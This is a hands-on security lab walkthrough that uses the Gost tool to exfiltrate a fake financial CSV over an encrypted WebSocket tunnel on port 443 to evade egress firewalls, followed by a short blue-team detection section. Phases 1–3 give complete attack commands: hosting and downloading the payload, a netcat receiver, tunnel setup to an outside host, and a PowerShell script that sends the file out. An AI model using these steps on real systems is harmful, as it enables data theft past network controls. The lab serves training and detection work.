![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Lab: Cloud-Based Services as Exfil using Gost

## The objective of this lab is to use Gost to establish an encrypted WebSocket (WSS) tunnel over port 443, bypassing simulated egress firewall rules to exfiltrate sensitive data. You will also learn how to detect this type of anomalous connection.

If you want to learn a bit about this tool check the [Gost Documentation](https://github.com/ginuerzh/gost)

---

### Phase 1: Staging the Attack (Ubuntu VM)
As an attacker, you already have your tools pre-staged on your server. We need to set up a delivery method for our Windows payload, a listener to catch the stolen data, and the Gost tunnel exit point.

- First things first, navigate to the directory where our tools are located:

```bash
cd /BnB/GostLab
ls -lh
```
You will need to use **3 terminals**.

- *Terminal 1:* Start a quick Python web server to host the Windows payload (gost.exe) so the victim machine can download it.

```bash
python3 -m http.server 8001
```
<img width="799" height="60" alt="image" src="https://github.com/user-attachments/assets/6591246d-4aaf-4bd4-a328-0d3f87fcc21f" />

- *Terminal 2:* Start a Netcat listener on port 8080. This is the final destination that will save the incoming stolen data to a file.

```bash
nc -lvnp 8080 > exfiltrated_data.csv
```
<img width="846" height="59" alt="image" src="https://github.com/user-attachments/assets/08c23a18-79ea-4cac-ad9f-f666913f1bb3" />

- *Terminal 3:* Start Gost to listen on port 443 (simulating standard HTTPS traffic) and forward that traffic internally to our Netcat listener. (Note down your Ubuntu VM IP address before running this, you will need it later).

```bash
sudo ./gost -L wss://:443/127.0.0.1:8080
```
<img width="865" height="57" alt="image" src="https://github.com/user-attachments/assets/81e9aa3f-c810-4c2a-93b9-ae0a1f9759e9" />

---

### Phase 2: Payload Delivery & Exfiltration (Windows VM)
Now we switch to the compromised Windows machine. We need to download the tunneling tool (Living off the Land) and extract the sensitive data.

- Open a PowerShell terminal. Let's check our "loot" before we steal it:

```powershell
cat C:\Users\Administrator\Desktop\Labs\GostLab\financial_records.csv
```
[Screenshot: Conținutul fișierului CSV cu datele false]

- Download the Gost payload directly from our Ubuntu server into a temporary folder. Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.

```powershell
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/gost.exe" -OutFile "$env:TEMP\gost.exe"
```

[Screenshot: Rularea Invoke-WebRequest fără erori, întorcându-se la prompt]

- Start the Gost tunnel entry point. This opens a local port (9000) and encapsulates everything we send to it into an encrypted WebSocket (WSS) stream directed at our Ubuntu server.

```powershell
& "$env:TEMP\gost.exe" -L tcp://:9000 -F wss://<UBUNTU_IP>:443
```

[Screenshot: Gost rulând pe Windows, deschizând portul 9000]

- Open a *NEW* PowerShell terminal. We will now push the sensitive financial records straight into the local end of the tunnel. 

```powershell
$client = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9000)
$stream = $client.GetStream()
$content = Get-Content -Raw C:\Users\Administrator\Desktop\Labs\GostLab\financial_records.csv
$bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
Write-Host "Exfil Complete!" -ForegroundColor Green
```

[Screenshot: Scriptul PS de trimitere rulat, afișând mesajul verde "Exfil Complete!"]

---

### Phase 3: Verification (Ubuntu VM)
Let's see if the firewall was bypassed successfully.

- Go back to your Ubuntu VM, specifically to *Terminal 2* (where Netcat was running). Press CTRL+C to stop the listener, then read the stolen data.

```bash
cat exfiltrated_data.csv
```
[Screenshot: Afișarea fișierului exfiltrat cu succes pe Linux, confirmând furtul]

---

### Phase 4: Blue Team Detection (Windows VM)
Why didn't the enterprise firewall block this? Because the traffic looked like a normal encrypted web connection (HTTPS/443). How can we detect it as defenders?

- Switch back to the Windows VM. Look for suspicious persistent connections. Although the traffic is encrypted, the process maintaining the connection is anomalous. 

```powershell
netstat -ano | findstr 443
```

[Screenshot: Output-ul netstat arătând conexiunea ESTABLISHED către IP-ul de Ubuntu pe portul 443]

- Match the PID (Process ID) from the previous command to the actual executable. (Replace <PID> with the number from the last column of your netstat output).

```powershell
Get-Process -Id <PID>
```

[Screenshot: Get-Process arătând clar că executabilul malițios 'gost' este cel care ține conexiunea deschisă]
